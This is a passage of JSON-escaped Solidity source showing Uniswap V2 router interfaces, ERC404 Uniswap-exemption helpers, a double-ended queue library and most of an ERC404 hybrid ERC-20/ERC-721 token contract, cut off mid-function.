amountToken, uint amountETH, uint liquidity);\\n    function removeLiquidity(\\n        address tokenA,\\n        address tokenB,\\n        uint liquidity,\\n        uint amountAMin,\\n        uint amountBMin,\\n        address to,\\n        uint deadline\\n    ) external returns (uint amountA, uint amountB);\\n    function removeLiquidityETH(\\n        address token,\\n        uint liquidity,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline\\n    ) external returns (uint amountToken, uint amountETH);\\n    function removeLiquidityWithPermit(\\n        address tokenA,\\n        address tokenB,\\n        uint liquidity,\\n        uint amountAMin,\\n        uint amountBMin,\\n        address to,\\n        uint deadline,\\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\\n    ) external returns (uint amountA, uint amountB);\\n    function removeLiquidityETHWithPermit(\\n        address token,\\n        uint liquidity,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline,\\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\\n    ) external returns (uint amountToken, uint amountETH);\\n    function swapExactTokensForTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external returns (uint[] memory amounts);\\n    function swapTokensForExactTokens(\\n        uint amountOut,\\n        uint amountInMax,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external returns (uint[] memory amounts);\\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\\n        external\\n        payable\\n        returns (uint[] memory amounts);\\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\\n        external\\n        returns (uint[] memory amounts);\\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\\n        external\\n        returns (uint[] memory amounts);\\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\\n        external\\n        payable\\n        returns (uint[] memory amounts);\\n\\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\\n}\\n\\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\\n        address token,\\n        uint liquidity,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline\\n    ) external returns (uint amountETH);\\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\\n        address token,\\n        uint liquidity,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline,\\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\\n    ) external returns (uint amountETH);\\n\\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external;\\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external payable;\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\\n        uint amountIn,\\n        uint amountOutMin,\\n        address[] calldata path,\\n        address to,\\n        uint deadline\\n    ) external;\\n}\\n\\n//SPDX-License-Identifier: MIT\\nabstract contract ERC404UniswapV2Exempt is ERC404 {\\n  constructor(address uniswapV2Router_) {\\n    IUniswapV2Router02 uniswapV2RouterContract = IUniswapV2Router02(\\n      uniswapV2Router_\\n    );\\n\\n    // Set the Uniswap v2 router as exempt.\\n    _setERC721TransferExempt(uniswapV2Router_, true);\\n\\n    // Determine the Uniswap v2 pair address for this token.\\n    address uniswapV2Pair = _getUniswapV2Pair(\\n      uniswapV2RouterContract.factory(),\\n      uniswapV2RouterContract.WETH()\\n    );\\n\\n    // Set the Uniswap v2 pair as exempt.\\n    _setERC721TransferExempt(uniswapV2Pair, true);\\n  }\\n\\n  function _getUniswapV2Pair(\\n    address uniswapV2Factory_,\\n    address weth_\\n  ) private view returns (address) {\\n    address thisAddress = address(this);\\n\\n    (address token0, address token1) = thisAddress < weth_\\n      ? (thisAddress, weth_)\\n      : (weth_, thisAddress);\\n\\n    return\\n      address(\\n        uint160(\\n          uint256(\\n            keccak256(\\n              abi.encodePacked(\\n                hex\\\"ff\\\",\\n                uniswapV2Factory_,\\n                keccak256(abi.encodePacked(token0, token1)),\\n                hex\\\"96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f\\\"\\n              )\\n            )\\n          )\\n        )\\n      );\\n  }\\n}\"\r\n    },\r\n    \"contracts/extensions/ERC404UniswapV3Exempt.sol\": {\r\n      \"content\": \"pragma solidity ^0.8.20;\\n\\n\\ninterface IERC721Receiver {\\n    /**\\n     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}\\n     * by `operator` from `from`, this function is called.\\n     *\\n     * It must return its Solidity selector to confirm the token transfer.\\n     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be\\n     * reverted.\\n     *\\n     * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.\\n     */\\n    function onERC721Received(\\n        address operator,\\n        address from,\\n        uint256 tokenId,\\n        bytes calldata data\\n    ) external returns (bytes4);\\n}\\n\\ninterface IERC165 {\\n    /**\\n     * @dev Returns true if this contract implements the interface defined by\\n     * `interfaceId`. See the corresponding\\n     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]\\n     * to learn more about how these ids are created.\\n     *\\n     * This function call must use less than 30 000 gas.\\n     */\\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\\n}\\n\\ninterface IERC404 {\\n  error NotFound();\\n  error InvalidTokenId();\\n  error AlreadyExists();\\n  error InvalidRecipient();\\n  error InvalidSender();\\n  error InvalidSpender();\\n  error InvalidOperator();\\n  error UnsafeRecipient();\\n  error RecipientIsERC721TransferExempt();\\n  error Unauthorized();\\n  error InsufficientAllowance();\\n  error DecimalsTooLow();\\n  error PermitDeadlineExpired();\\n  error InvalidSigner();\\n  error InvalidApproval();\\n  error OwnedIndexOverflow();\\n  error MintLimitReached();\\n  error InvalidExemption();\\n\\n  function name() external view returns (string memory);\\n  function symbol() external view returns (string memory);\\n  function decimals() external view returns (uint8);\\n  function totalSupply() external view returns (uint256);\\n  function erc20TotalSupply() external view returns (uint256);\\n  function erc721TotalSupply() external view returns (uint256);\\n  function balanceOf(address owner_) external view returns (uint256);\\n  function erc721BalanceOf(address owner_) external view returns (uint256);\\n  function erc20BalanceOf(address owner_) external view returns (uint256);\\n  function erc721TransferExempt(address account_) external view returns (bool);\\n  function isApprovedForAll(\\n    address owner_,\\n    address operator_\\n  ) external view returns (bool);\\n  function allowance(\\n    address owner_,\\n    address spender_\\n  ) external view returns (uint256);\\n  function owned(address owner_) external view returns (uint256[] memory);\\n  function ownerOf(uint256 id_) external view returns (address erc721Owner);\\n  function tokenURI(uint256 id_) external view returns (string memory);\\n  function approve(\\n    address spender_,\\n    uint256 valueOrId_\\n  ) external returns (bool);\\n  function erc20Approve(\\n    address spender_,\\n    uint256 value_\\n  ) external returns (bool);\\n  function erc721Approve(address spender_, uint256 id_) external;\\n  function setApprovalForAll(address operator_, bool approved_) external;\\n  function transferFrom(\\n    address from_,\\n    address to_,\\n    uint256 valueOrId_\\n  ) external returns (bool);\\n  function erc20TransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 value_\\n  ) external returns (bool);\\n  function erc721TransferFrom(address from_, address to_, uint256 id_) external;\\n  function transfer(address to_, uint256 amount_) external returns (bool);\\n  function getERC721QueueLength() external view returns (uint256);\\n  function getERC721TokensInQueue(\\n    uint256 start_,\\n    uint256 count_\\n  ) external view returns (uint256[] memory);\\n  function setSelfERC721TransferExempt(bool state_) external;\\n  function safeTransferFrom(address from_, address to_, uint256 id_) external;\\n  function safeTransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 id_,\\n    bytes calldata data_\\n  ) external;\\n  function DOMAIN_SEPARATOR() external view returns (bytes32);\\n  function permit(\\n    address owner_,\\n    address spender_,\\n    uint256 value_,\\n    uint256 deadline_,\\n    uint8 v_,\\n    bytes32 r_,\\n    bytes32 s_\\n  ) external;\\n}\\n\\nlibrary DoubleEndedQueue {\\n  /**\\n   * @dev An operation (e.g. {front}) couldn't be completed due to the queue being empty.\\n   */\\n  error QueueEmpty();\\n\\n  /**\\n   * @dev A push operation couldn't be completed due to the queue being full.\\n   */\\n  error QueueFull();\\n\\n  /**\\n   * @dev An operation (e.g. {at}) couldn't be completed due to an index being out of bounds.\\n   */\\n  error QueueOutOfBounds();\\n\\n  /**\\n   * @dev Indices are 128 bits so begin and end are packed in a single storage slot for efficient access.\\n   *\\n   * Struct members have an underscore prefix indicating that they are \\\"private\\\" and should not be read or written to\\n   * directly. Use the functions provided below instead. Modifying the struct manually may violate assumptions and\\n   * lead to unexpected behavior.\\n   *\\n   * The first item is at data[begin] and the last item is at data[end - 1]. This range can wrap around.\\n   */\\n  struct Uint256Deque {\\n    uint128 _begin;\\n    uint128 _end;\\n    mapping(uint128 index => uint256) _data;\\n  }\\n\\n  /**\\n   * @dev Inserts an item at the end of the queue.\\n   *\\n   * Reverts with {QueueFull} if the queue is full.\\n   */\\n  function pushBack(Uint256Deque storage deque, uint256 value) internal {\\n    unchecked {\\n      uint128 backIndex = deque._end;\\n      if (backIndex + 1 == deque._begin) revert QueueFull();\\n      deque._data[backIndex] = value;\\n      deque._end = backIndex + 1;\\n    }\\n  }\\n\\n  /**\\n   * @dev Removes the item at the end of the queue and returns it.\\n   *\\n   * Reverts with {QueueEmpty} if the queue is empty.\\n   */\\n  function popBack(\\n    Uint256Deque storage deque\\n  ) internal returns (uint256 value) {\\n    unchecked {\\n      uint128 backIndex = deque._end;\\n      if (backIndex == deque._begin) revert QueueEmpty();\\n      --backIndex;\\n      value = deque._data[backIndex];\\n      delete deque._data[backIndex];\\n      deque._end = backIndex;\\n    }\\n  }\\n\\n  /**\\n   * @dev Inserts an item at the beginning of the queue.\\n   *\\n   * Reverts with {QueueFull} if the queue is full.\\n   */\\n  function pushFront(Uint256Deque storage deque, uint256 value) internal {\\n    unchecked {\\n      uint128 frontIndex = deque._begin - 1;\\n      if (frontIndex == deque._end) revert QueueFull();\\n      deque._data[frontIndex] = value;\\n      deque._begin = frontIndex;\\n    }\\n  }\\n\\n  /**\\n   * @dev Removes the item at the beginning of the queue and returns it.\\n   *\\n   * Reverts with `QueueEmpty` if the queue is empty.\\n   */\\n  function popFront(\\n    Uint256Deque storage deque\\n  ) internal returns (uint256 value) {\\n    unchecked {\\n      uint128 frontIndex = deque._begin;\\n      if (frontIndex == deque._end) revert QueueEmpty();\\n      value = deque._data[frontIndex];\\n      delete deque._data[frontIndex];\\n      deque._begin = frontIndex + 1;\\n    }\\n  }\\n\\n  /**\\n   * @dev Returns the item at the beginning of the queue.\\n   *\\n   * Reverts with `QueueEmpty` if the queue is empty.\\n   */\\n  function front(\\n    Uint256Deque storage deque\\n  ) internal view returns (uint256 value) {\\n    if (empty(deque)) revert QueueEmpty();\\n    return deque._data[deque._begin];\\n  }\\n\\n  /**\\n   * @dev Returns the item at the end of the queue.\\n   *\\n   * Reverts with `QueueEmpty` if the queue is empty.\\n   */\\n  function back(\\n    Uint256Deque storage deque\\n  ) internal view returns (uint256 value) {\\n    if (empty(deque)) revert QueueEmpty();\\n    unchecked {\\n      return deque._data[deque._end - 1];\\n    }\\n  }\\n\\n  /**\\n   * @dev Return the item at a position in the queue given by `index`, with the first item at 0 and last item at\\n   * `length(deque) - 1`.\\n   *\\n   * Reverts with `QueueOutOfBounds` if the index is out of bounds.\\n   */\\n  function at(\\n    Uint256Deque storage deque,\\n    uint256 index\\n  ) internal view returns (uint256 value) {\\n    if (index >= length(deque)) revert QueueOutOfBounds();\\n    // By construction, length is a uint128, so the check above ensures that index can be safely downcast to uint128\\n    unchecked {\\n      return deque._data[deque._begin + uint128(index)];\\n    }\\n  }\\n\\n  /**\\n   * @dev Resets the queue back to being empty.\\n   *\\n   * NOTE: The current items are left behind in storage. This does not affect the functioning of the queue, but misses\\n   * out on potential gas refunds.\\n   */\\n  function clear(Uint256Deque storage deque) internal {\\n    deque._begin = 0;\\n    deque._end = 0;\\n  }\\n\\n  /**\\n   * @dev Returns the number of items in the queue.\\n   */\\n  function length(Uint256Deque storage deque) internal view returns (uint256) {\\n    unchecked {\\n      return uint256(deque._end - deque._begin);\\n    }\\n  }\\n\\n  /**\\n   * @dev Returns true if the queue is empty.\\n   */\\n  function empty(Uint256Deque storage deque) internal view returns (bool) {\\n    return deque._end == deque._begin;\\n  }\\n}\\n\\nlibrary ERC721Events {\\n  event ApprovalForAll(\\n    address indexed owner,\\n    address indexed operator,\\n    bool approved\\n  );\\n  event Approval(\\n    address indexed owner,\\n    address indexed spender,\\n    uint256 indexed id\\n  );\\n  event Transfer(address indexed from, address indexed to, uint256 indexed id);\\n}\\n\\nlibrary ERC20Events {\\n  event Approval(address indexed owner, address indexed spender, uint256 value);\\n  event Transfer(address indexed from, address indexed to, uint256 amount);\\n}\\n\\nabstract contract ERC404 is IERC404 {\\n  using DoubleEndedQueue for DoubleEndedQueue.Uint256Deque;\\n\\n  /// @dev The queue of ERC-721 tokens stored in the contract.\\n  DoubleEndedQueue.Uint256Deque private _storedERC721Ids;\\n\\n  /// @dev Token name\\n  string public name;\\n\\n  /// @dev Token symbol\\n  string public symbol;\\n\\n  /// @dev Decimals for ERC-20 representation\\n  uint8 public immutable decimals;\\n\\n  /// @dev Units for ERC-20 representation\\n  uint256 public immutable units;\\n\\n  /// @dev Total supply in ERC-20 representation\\n  uint256 public totalSupply;\\n\\n  /// @dev Current mint counter which also represents the highest\\n  ///      minted id, monotonically increasing to ensure accurate ownership\\n  uint256 public minted;\\n\\n  /// @dev Initial chain id for EIP-2612 support\\n  uint256 internal immutable _INITIAL_CHAIN_ID;\\n\\n  /// @dev Initial domain separator for EIP-2612 support\\n  bytes32 internal immutable _INITIAL_DOMAIN_SEPARATOR;\\n\\n  /// @dev Balance of user in ERC-20 representation\\n  mapping(address => uint256) public balanceOf;\\n\\n  /// @dev Allowance of user in ERC-20 representation\\n  mapping(address => mapping(address => uint256)) public allowance;\\n\\n  /// @dev Approval in ERC-721 representaion\\n  mapping(uint256 => address) public getApproved;\\n\\n  /// @dev Approval for all in ERC-721 representation\\n  mapping(address => mapping(address => bool)) public isApprovedForAll;\\n\\n  /// @dev Packed representation of ownerOf and owned indices\\n  mapping(uint256 => uint256) internal _ownedData;\\n\\n  /// @dev Array of owned ids in ERC-721 representation\\n  mapping(address => uint256[]) internal _owned;\\n\\n  /// @dev Addresses that are exempt from ERC-721 transfer, typically for gas savings (pairs, routers, etc)\\n  mapping(address => bool) internal _erc721TransferExempt;\\n\\n  /// @dev EIP-2612 nonces\\n  mapping(address => uint256) public nonces;\\n\\n  /// @dev Address bitmask for packed ownership data\\n  uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;\\n\\n  /// @dev Owned index bitmask for packed ownership data\\n  uint256 private constant _BITMASK_OWNED_INDEX = ((1 << 96) - 1) << 160;\\n\\n  /// @dev Constant for token id encoding\\n  uint256 public constant ID_ENCODING_PREFIX = 1 << 255;\\n\\n  constructor(string memory name_, string memory symbol_, uint8 decimals_) {\\n    name = name_;\\n    symbol = symbol_;\\n\\n    if (decimals_ < 18) {\\n      revert DecimalsTooLow();\\n    }\\n\\n    decimals = decimals_;\\n    units = 10 ** decimals;\\n\\n    // EIP-2612 initialization\\n    _INITIAL_CHAIN_ID = block.chainid;\\n    _INITIAL_DOMAIN_SEPARATOR = _computeDomainSeparator();\\n  }\\n\\n  /// @notice Function to find owner of a given ERC-721 token\\n  function ownerOf(\\n    uint256 id_\\n  ) public view virtual returns (address erc721Owner) {\\n    erc721Owner = _getOwnerOf(id_);\\n\\n    if (!_isValidTokenId(id_)) {\\n      revert InvalidTokenId();\\n    }\\n\\n    if (erc721Owner == address(0)) {\\n      revert NotFound();\\n    }\\n  }\\n\\n  function owned(\\n    address owner_\\n  ) public view virtual returns (uint256[] memory) {\\n    return _owned[owner_];\\n  }\\n\\n  function erc721BalanceOf(\\n    address owner_\\n  ) public view virtual returns (uint256) {\\n    return _owned[owner_].length;\\n  }\\n\\n  function erc20BalanceOf(\\n    address owner_\\n  ) public view virtual returns (uint256) {\\n    return balanceOf[owner_];\\n  }\\n\\n  function erc20TotalSupply() public view virtual returns (uint256) {\\n    return totalSupply;\\n  }\\n\\n  function erc721TotalSupply() public view virtual returns (uint256) {\\n    return minted;\\n  }\\n\\n  function getERC721QueueLength() public view virtual returns (uint256) {\\n    return _storedERC721Ids.length();\\n  }\\n\\n  function getERC721TokensInQueue(\\n    uint256 start_,\\n    uint256 count_\\n  ) public view virtual returns (uint256[] memory) {\\n    uint256[] memory tokensInQueue = new uint256[](count_);\\n\\n    for (uint256 i = start_; i < start_ + count_; ) {\\n      tokensInQueue[i - start_] = _storedERC721Ids.at(i);\\n\\n      unchecked {\\n        ++i;\\n      }\\n    }\\n\\n    return tokensInQueue;\\n  }\\n\\n  /// @notice tokenURI must be implemented by child contract\\n  function tokenURI(uint256 id_) public view virtual returns (string memory);\\n\\n  /// @notice Function for token approvals\\n  /// @dev This function assumes the operator is attempting to approve\\n  ///      an ERC-721 if valueOrId_ is a possibly valid ERC-721 token id.\\n  ///      Unlike setApprovalForAll, spender_ must be allowed to be 0x0 so\\n  ///      that approval can be revoked.\\n  function approve(\\n    address spender_,\\n    uint256 valueOrId_\\n  ) public virtual returns (bool) {\\n    if (_isValidTokenId(valueOrId_)) {\\n      erc721Approve(spender_, valueOrId_);\\n    } else {\\n      return erc20Approve(spender_, valueOrId_);\\n    }\\n\\n    return true;\\n  }\\n\\n  function erc721Approve(address spender_, uint256 id_) public virtual {\\n    // Intention is to approve as ERC-721 token (id).\\n    address erc721Owner = _getOwnerOf(id_);\\n\\n    if (\\n      msg.sender != erc721Owner && !isApprovedForAll[erc721Owner][msg.sender]\\n    ) {\\n      revert Unauthorized();\\n    }\\n\\n    getApproved[id_] = spender_;\\n\\n    emit ERC721Events.Approval(erc721Owner, spender_, id_);\\n  }\\n\\n  /// @dev Providing type(uint256).max for approval value results in an\\n  ///      unlimited approval that is not deducted from on transfers.\\n  function erc20Approve(\\n    address spender_,\\n    uint256 value_\\n  ) public virtual returns (bool) {\\n    // Prevent granting 0x0 an ERC-20 allowance.\\n    if (spender_ == address(0)) {\\n      revert InvalidSpender();\\n    }\\n\\n    allowance[msg.sender][spender_] = value_;\\n\\n    emit ERC20Events.Approval(msg.sender, spender_, value_);\\n\\n    return true;\\n  }\\n\\n  /// @notice Function for ERC-721 approvals\\n  function setApprovalForAll(address operator_, bool approved_) public virtual {\\n    // Prevent approvals to 0x0.\\n    if (operator_ == address(0)) {\\n      revert InvalidOperator();\\n    }\\n    isApprovedForAll[msg.sender][operator_] = approved_;\\n    emit ERC721Events.ApprovalForAll(msg.sender, operator_, approved_);\\n  }\\n\\n  /// @notice Function for mixed transfers from an operator that may be different than 'from'.\\n  /// @dev This function assumes the operator is attempting to transfer an ERC-721\\n  ///      if valueOrId is a possible valid token id.\\n  function transferFrom(\\n    address from_,\\n    address to_,\\n    uint256 valueOrId_\\n  ) public virtual returns (bool) {\\n    if (_isValidTokenId(valueOrId_)) {\\n      erc721TransferFrom(from_, to_, valueOrId_);\\n    } else {\\n      // Intention is to transfer as ERC-20 token (value).\\n      return erc20TransferFrom(from_, to_, valueOrId_);\\n    }\\n\\n    return true;\\n  }\\n\\n  /// @notice Function for ERC-721 transfers from.\\n  /// @dev This function is recommended for ERC721 transfers.\\n  function erc721TransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 id_\\n  ) public virtual {\\n    // Prevent minting tokens from 0x0.\\n    if (from_ == address(0)) {\\n      revert InvalidSender();\\n    }\\n\\n    // Prevent burning tokens to 0x0.\\n    if (to_ == address(0)) {\\n      revert InvalidRecipient();\\n    }\\n\\n    if (from_ != _getOwnerOf(id_)) {\\n      revert Unauthorized();\\n    }\\n\\n    // Check that the operator is either the sender or approved for the transfer.\\n    if (\\n      msg.sender != from_ &&\\n      !isApprovedForAll[from_][msg.sender] &&\\n      msg.sender != getApproved[id_]\\n    ) {\\n      revert Unauthorized();\\n    }\\n\\n    // We only need to check ERC-721 transfer exempt status for the recipient\\n    // since the sender being ERC-721 transfer exempt means they have already\\n    // had their ERC-721s stripped away during the rebalancing process.\\n    if (erc721TransferExempt(to_)) {\\n      revert RecipientIsERC721TransferExempt();\\n    }\\n\\n    // Transfer 1 * units ERC-20 and 1 ERC-721 token.\\n    // ERC-721 transfer exemptions handled above. Can't make it to this point if either is transfer exempt.\\n    _transferERC20(from_, to_, units);\\n    _transferERC721(from_, to_, id_);\\n  }\\n\\n  /// @notice Function for ERC-20 transfers from.\\n  /// @dev This function is recommended for ERC20 transfers\\n  function erc20TransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 value_\\n  ) public virtual returns (bool) {\\n    // Prevent minting tokens from 0x0.\\n    if (from_ == address(0)) {\\n      revert InvalidSender();\\n    }\\n\\n    // Prevent burning tokens to 0x0.\\n    if (to_ == address(0)) {\\n      revert InvalidRecipient();\\n    }\\n\\n    uint256 allowed = allowance[from_][msg.sender];\\n\\n    // Check that the operator has sufficient allowance.\\n    if (allowed != type(uint256).max) {\\n      allowance[from_][msg.sender] = allowed - value_;\\n    }\\n\\n    // Transferring ERC-20s directly requires the _transferERC20WithERC721 function.\\n    // Handles ERC-721 exemptions internally.\\n    return _transferERC20WithERC721(from_, to_, value_);\\n  }\\n\\n  /// @notice Function for ERC-20 transfers.\\n  /// @dev This function assumes the operator is attempting to transfer as ERC-20\\n  ///      given this function is only supported on the ERC-20 interface.\\n  ///      Treats even large amounts that are valid ERC-721 ids as ERC-20s.\\n  function transfer(address to_, uint256 value_) public virtual returns (bool) {\\n    // Prevent burning tokens to 0x0.\\n    if (to_ == address(0)) {\\n      revert InvalidRecipient();\\n    }\\n\\n    // Transferring ERC-20s directly requires the _transferERC20WithERC721 function.\\n    // Handles ERC-721 exemptions internally.\\n    return _transferERC20WithERC721(msg.sender, to_, value_);\\n  }\\n\\n  /// @notice Function for ERC-721 transfers with contract support.\\n  /// This function only supports moving valid ERC-721 ids, as it does not exist on the ERC-20\\n  /// spec and will revert otherwise.\\n  function safeTransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 id_\\n  ) public virtual {\\n    safeTransferFrom(from_, to_, id_, \\\"\\\");\\n  }\\n\\n  /// @notice Function for ERC-721 transfers with contract support and callback data.\\n  /// This function only supports moving valid ERC-721 ids, as it does not exist on the\\n  /// ERC-20 spec and will revert otherwise.\\n  function safeTransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 id_,\\n    bytes memory data_\\n  ) public virtual {\\n    if (!_isValidTokenId(id_)) {\\n      revert InvalidTokenId();\\n    }\\n\\n    transferFrom(from_, to_, id_);\\n\\n    if (\\n      to_.code.length != 0 &&\\n      IERC721Receiver(to_).onERC721Received(msg.sender, from_, id_, data_) !=\\n      IERC721Receiver.onERC721Received.selector\\n    ) {\\n      revert UnsafeRecipient();\\n    }\\n  }\\n\\n  /// @notice Function for EIP-2612 permits (ERC-20 only).\\n  /// @dev Providing type(uint256).max for permit value results in an\\n  ///      unlimited approval that is not deducted from on transfers.\\n  function permit(\\n    address owner_,\\n    address spender_,\\n    uint256 value_,\\n    uint256 deadline_,\\n    uint8 v_,\\n    bytes32 r_,\\n    bytes32 s_\\n  ) public virtual {\\n    if (deadline_ < block.timestamp) {\\n      revert PermitDeadlineExpired();\\n    }\\n\\n    // permit cannot be used for ERC-721 token approvals, so ensure\\n    // the value does not fall within the valid range of ERC-721 token ids.\\n    if (_isValidTokenId(value_)) {\\n      revert InvalidApproval();\\n    }\\n\\n    if (spender_ == address(0)) {\\n      revert InvalidSpender();\\n    }\\n\\n    unchecked {\\n      address recoveredAddress = ecrecover(\\n        keccak256(\\n          abi.encodePacked(\\n            \\\"\\\\x19\\\\x01\\\",\\n            DOMAIN_SEPARATOR(),\\n            keccak256(\\n              abi.encode(\\n                keccak256(\\n                  \\\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\\\"\\n                ),\\n                owner_,\\n                spender_,\\n                value_,\\n                nonces[owner_]++,\\n                deadline_\\n              )\\n            )\\n          )\\n        ),\\n        v_,\\n        r_,\\n        s_\\n      );\\n\\n      if (recoveredAddress == address(0) || recoveredAddress != owner_) {\\n        revert InvalidSigner();\\n      }\\n\\n      allowance[recoveredAddress][spender_] = value_;\\n    }\\n\\n    emit ERC20Events.Approval(owner_, spender_, value_);\\n  }\\n\\n  /// @notice Returns domain initial domain separator, or recomputes if chain id is not equal to initial chain id\\n  function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {\\n    return\\n      block.chainid == _INITIAL_CHAIN_ID\\n        ? _INITIAL_DOMAIN_SEPARATOR\\n        : _computeDomainSeparator();\\n  }\\n\\n  function supportsInterface(\\n    bytes4 interfaceId\\n  ) public view virtual returns (bool) {\\n    return\\n      interfaceId == type(IERC404).interfaceId ||\\n      interfaceId == type(IERC165).interfaceId;\\n  }\\n\\n  /// @notice Function for self-exemption\\n  function setSelfERC721TransferExempt(bool state_) public virtual {\\n    _setERC721TransferExempt(msg.sender, state_);\\n  }\\n\\n  /// @notice Function to check if address is transfer exempt\\n  function erc721TransferExempt(\\n    address target_\\n  ) public view virtual returns (bool) {\\n    return target_ == address(0) || _erc721TransferExempt[target_];\\n  }\\n\\n  /// @notice For a token token id to be considered valid, it just needs\\n  ///         to fall within the range of possible token ids, it does not\\n  ///         necessarily have to be minted yet.\\n  function _isValidTokenId(uint256 id_) internal pure returns (bool) {\\n    return id_ > ID_ENCODING_PREFIX && id_ != type(uint256).max;\\n  }\\n\\n  /// @notice Internal function to compute domain separator for EIP-2612 permits\\n  function _computeDomainSeparator() internal view virtual returns (bytes32) {\\n    return\\n      keccak256(\\n        abi.encode(\\n          keccak256(\\n            \\\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\\\"\\n          ),\\n          keccak256(bytes(name)),\\n          keccak256(\\\"1\\\"),\\n          block.chainid,\\n          address(this)\\n        )\\n      );\\n  }\\n\\n  /// @notice This is the lowest level ERC-20 transfer function, which\\n  ///         should be used for both normal ERC-20 transfers as well as minting.\\n  /// Note that this function allows transfers to and from 0x0.\\n  function _transferERC20(\\n    address from_,\\n    address to_,\\n    uint256 value_\\n  ) internal virtual {\\n    // Minting is a special case for which we should not check the balance of\\n    // the sender, and we should increase the total supply.\\n    if (from_ == address(0)) {\\n      totalSupply += value_;\\n    } else {\\n      // Deduct value from sender's balance.\\n      balanceOf[from_] -= value_;\\n    }\\n\\n    // Update the recipient's balance.\\n    // Can be unchecked because on mint, adding to totalSupply is checked, and on transfer balance deduction is checked.\\n    unchecked {\\n      balanceOf[to_] += value_;\\n    }\\n\\n    emit ERC20Events.Transfer(from_, to_, value_);\\n  }\\n\\n  /// @notice Consolidated record keeping function for transferring ERC-721s.\\n  /// @dev Assign the token to the new owner, and remove from the old owner.\\n  /// Note that this function allows transfers to and from 0x0.\\n  /// Does not handle ERC-721 exemptions.\\n  function _transferERC721(\\n    address from_,\\n    address to_,\\n    uint256 id_\\n  ) internal virtual {\\n    // If this is not a mint, handle record keeping for transfer from previous owner.\\n    if (from_ != address(0)) {\\n      // On transfer of an NFT, any previous approval is reset.\\n      delete getApproved[id_];\\n\\n      uint256 updatedId = _owned[from_][_owned[from_].length - 1];\\n      if (updatedId != id_) {\\n        uint256 updatedIndex = _getOwnedIndex(id_);\\n        // update _owned for sender\\n        _owned[from_][updatedIndex] = updatedId;\\n        // update index for the moved id\\n        _setOwnedIndex(updatedId, updatedIndex);\\n      }\\n\\n      // pop\\n      _owned[from_].pop();\\n    }\\n\\n    // Check if this is a burn.\\n    if (to_ != address(0)) {\\n      // If not a burn, update the owner of the token to the new owner.\\n      // Update owner of the token to the new owner.\\n      _setOwnerOf(id_, to_);\\n      // Push token onto the new owner's stack.\\n      _owned[to_].push(id_);\\n      // Update index for new owner's stack.\\n      _setOwnedIndex(id_, _owned[to_].length - 1);\\n    } else {\\n      // If this is a burn, reset the owner of the token to 0x0 by deleting the token from _ownedData.\\n      delete _ownedData[id_];\\n    }\\n\\n    emit ERC721Events.Transfer(from_, to_, id_);\\n  }\\n\\n  /// @notice Internal function for ERC-20 transfers. Also handles any ERC-721 transfers that may be required.\\n  // Handles ERC-721 exemptions.\\n  function _transferERC20WithERC721(\\n    address from_,\\n    address to_,\\n    uint256 value_\\n  ) internal virtual returns (bool) {\\n    uint256 erc20BalanceOfSenderBefore = erc20BalanceOf(from_);\\n    uint256 erc20BalanceOfReceiverBefore = erc20BalanceOf(to_);\\n\\n    _transferERC20(from_, to_, value_);\\n\\n    // Preload for gas savings on branches\\n    bool isFromERC721TransferExempt = erc721TransferExempt(from_);\\n    bool isToERC721TransferExempt = erc721TransferExempt(to_);\\n\\n    // Skip _withdrawAndStoreERC721 and/or _retrieveOrMintERC721 for ERC-721 transfer exempt addresses\\n    // 1) to save gas\\n    // 2) because ERC-721 transfer exempt addresses won't always have/need ERC-721s corresponding to their ERC20s.\\n    if (isFromERC721TransferExempt && isToERC721TransferExempt) {\\n      // Case 1) Both sender and recipient are ERC-721 transfer exempt. No ERC-721s need to be transferred.\\n      // NOOP.\\n    } else if (isFromERC721TransferExempt) {\\n      // Case 2) The sender is ERC-721 transfer 